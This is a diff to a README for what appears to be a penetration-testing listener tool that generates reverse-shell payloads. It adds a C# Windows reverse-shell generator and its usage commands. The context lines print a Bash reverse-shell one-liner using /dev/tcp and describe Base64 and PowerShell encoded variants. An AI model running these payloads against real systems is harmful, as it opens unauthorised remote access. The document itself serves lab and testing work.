@@ -139,11 +139,13 @@ Generates payloads using the listener's IP and port:
 - **Bash** — `bash -i >& /dev/tcp/IP/PORT 0>&1`
 - **Bash Base64** — Base64-encoded bash payload (bypasses special character issues)
 - **PowerShell** — UTF-16LE encoded PowerShell reverse shell
+- **CSharp** — source generator for a Windows reverse shell, with optional local `.exe` compilation
 
-You can also override the IP/port:
+Optional C# usage:
 
 ```
-󰗣 flame ❯ rev 10.10.14.5 9001
+󰗣 flame ❯ rev csharp
+󰗣 flame ❯ rev csharp shell.exe
 ```
 
 ## Session Logging
